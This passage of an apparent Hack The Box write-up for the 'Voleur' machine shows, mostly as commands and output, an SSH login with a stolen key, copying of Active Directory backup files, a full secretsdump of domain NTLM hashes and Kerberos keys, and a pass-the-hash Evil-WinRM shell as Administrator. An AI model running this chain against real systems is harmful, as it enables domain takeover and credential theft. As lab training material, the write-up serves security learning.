ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC

```

ok so i was right this id_rsa is for svc_backup.... 
```
ssh -i id_rsa svc_backup@dc.voleur.htb -p 2222
The authenticity of host '[dc.voleur.htb]:2222 ([10.129.204.18]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[dc.voleur.htb]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 29 07:51:36 PDT 2026

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   33%       IPv4 address for eth0: 10.129.204.18
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd
   
   svc_backup@DC:~$ ls -lA
total 8
-rw-r--r-- 1 svc_backup svc_backup  220 Jan 30  2025 .bash_logout
-rw-r--r-- 1 svc_backup svc_backup 3837 Jan 30  2025 .bashrc
drwx------ 1 svc_backup svc_backup 4096 Jan 30  2025 .cache
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .landscape
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .local
-rw-r--r-- 1 svc_backup svc_backup    0 Apr 29 06:37 .motd_shown
-rw-r--r-- 1 svc_backup svc_backup  807 Jan 30  2025 .profile
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .ssh
-rw-r--r-- 1 svc_backup svc_backup    0 Jan 30  2025 .sudo_as_admin_successful
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

and we can run all the commands with no password.... interesting.... 
```
svc_backup@DC:~$ cd /mnt/c/IT/"Third-Line Support"/Backups/"Active Directory"
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
```

so in backup's there was ntds files... we can use these to get admin pass....
```
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd ..
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM

```

lets get the hashes.... 
```
scp -i ~/id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
SECURITY                                   100%   32KB 115.8KB/s   00:00    
SYSTEM                                     100%   18MB   3.9MB/s   00:04    
scp -i ~/id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .
ntds.dit                                   100%   24MB   8.9MB/s   00:02    
ntds.jfm                                   100%   16KB  58.2KB/s   00:00
```

```
impacket-secretsdump LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...

```
got admin ntlm now lets get root flag... 
```
impacket-getTGT voleur.htb/'administrator' -hashes :e656e07c56d831611b577b160b259ad2
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=administrator.ccache
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb -k administrator.ccache                
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
239ca759f90c2bf184733ee1b1372d44

```

